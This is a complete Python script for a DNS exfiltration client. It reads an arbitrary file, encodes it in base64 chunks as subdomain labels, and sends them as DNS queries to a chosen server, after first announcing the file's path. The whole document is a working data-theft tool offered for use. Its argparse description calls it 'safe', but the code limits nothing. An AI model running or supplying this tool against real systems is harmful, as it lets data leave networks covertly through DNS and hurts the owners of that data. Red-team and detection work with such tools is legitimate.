#!/usr/bin/env python3

import argparse
import base64
import os
import socket
import time
import traceback
from dnslib import DNSRecord

MAX_LABEL_LEN = 63
CHUNK_SIZE = 30  # bytes per chunk

def encode_chunk_safe(chunk, max_label_len=MAX_LABEL_LEN):
    """
    Encode a chunk using base64 (URL-safe) and split it into DNS-safe labels.
    """
    b64 = base64.urlsafe_b64encode(chunk).decode('ascii').rstrip('=')
    return [b64[i:i+max_label_len] for i in range(0, len(b64), max_label_len)]

def validate_labels(qname):
    """
    Validate domain labels against DNS limits.
    """
    labels = qname.split(".")
    for l in labels:
        if not isinstance(l, str):
            raise ValueError(f"Non-string label detected: {repr(l)}")
        if len(l) > MAX_LABEL_LEN:
            raise ValueError(f"Label too long ({len(l)} chars): {l}")

def send_qname(qname, server):
    """
    Send a DNS query using dnslib with UDP.
    """
    try:
        validate_labels(qname)
        pkt = DNSRecord.question(qname, qtype="A")  # MUST be string!
        raw = pkt.pack()

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2)
            s.sendto(raw, (server, 53))

    except Exception as e:
        print(f"[!] Failed to send: {qname} — {e}")
        traceback.print_exc()

def chunk_data(data, size=CHUNK_SIZE):
    """
    Yield fixed-size byte chunks from the given data.
    """
    for i in range(0, len(data), size):
        yield data[i:i+size]

def exfil_file(path, server_ip, domain_base, delay=0.1):
    """
    Send a file over DNS, chunked and encoded as subdomain queries.
    """
    if not os.path.isfile(path):
        print(f"[!] File not found: {path}")
        return

    with open(path, "rb") as f:
        content = f.read()

    # Send file path as signal
    clean_path = path.strip("/").replace("/", "_")
    qname_path = f"path.{clean_path}.{domain_base}"
    print(f"[+] Sending file path: {qname_path}")
    send_qname(qname_path, server_ip)
    time.sleep(delay)

    # Send chunks
    chunks = list(chunk_data(content))
    total = len(chunks)

    for i, chunk in enumerate(chunks):
        labels = encode_chunk_safe(chunk)
        qname = ".".join(labels + [str(i), domain_base])
        print(f"[+] Sending chunk {i}/{total - 1}")
        send_qname(qname, server_ip)
        time.sleep(delay)

    print(f"[✓] Exfiltration complete: {total} chunks sent.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Safe DNS exfiltration client using dnslib")
    parser.add_argument("file", help="Path to the file to exfiltrate")
    parser.add_argument("server", help="DNS server IP")
    parser.add_argument("domain", help="Base domain (e.g. exfil.dns.local)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between packets in seconds")

    args = parser.parse_args()
    exfil_file(args.file, args.server, args.domain, args.delay)

